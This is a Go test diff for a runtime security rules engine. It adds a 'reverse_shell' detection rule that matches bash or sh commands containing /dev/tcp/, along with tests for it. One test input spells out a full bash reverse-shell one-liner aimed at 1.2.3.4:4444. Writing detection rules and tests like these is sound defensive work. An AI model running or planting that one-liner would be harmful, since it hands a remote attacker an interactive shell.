@@ -59,6 +59,12 @@ const rulesDoc = `
   priority: critical
   match:
     path_exact: [/var/run/docker.sock]
+- name: reverse_shell
+  event: exec
+  priority: critical
+  match:
+    comm_in: [bash, sh]
+    args_contains: [/dev/tcp/]
 `
 
 func names(ds []Detection) []string {
@@ -100,6 +106,8 @@ func TestEngineEval(t *testing.T) {
 		{"db port", event.Event{Type: event.Connect, DestPort: 5432}, enrich.Info{}, []string{"db_connect"}},
 		{"other connect no match", event.Event{Type: event.Connect, DestIP: "8.8.8.8", DestPort: 53}, enrich.Info{}, nil},
 		{"unix docker sock", event.Event{Type: event.Connect, Filename: "/var/run/docker.sock"}, enrich.Info{}, []string{"docker_sock"}},
+		{"reverse shell args", event.Event{Type: event.Exec, Comm: "bash", Args: "bash -c bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}, enrich.Info{}, []string{"reverse_shell"}},
+		{"bash without tcp", event.Event{Type: event.Exec, Comm: "bash", Args: "bash -c ls"}, enrich.Info{}, nil},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -119,6 +127,7 @@ func TestLoadValidation(t *testing.T) {
 		"invalid workload": "- name: r\n  event: exec\n  priority: low\n  match:\n    workload: contaner\n    comm_in: [sh]\n",
 		"invalid access":   "- name: r\n  event: open\n  priority: low\n  match:\n    access: sideways\n    path_exact: [/x]\n",
 		"access on exec":   "- name: r\n  event: exec\n  priority: low\n  match:\n    access: read\n    comm_in: [sh]\n",
+		"args on open":     "- name: r\n  event: open\n  priority: low\n  match:\n    args_contains: [x]\n",
 		"empty match":      "- name: r\n  event: exec\n  priority: low\n",
 		"long comm":        "- name: r\n  event: exec\n  priority: low\n  match:\n    comm_in: [this_process_name_is_far_too_long]\n",
 		"missing name":     "- event: exec\n  priority: low\n  match:\n    comm_in: [sh]\n",
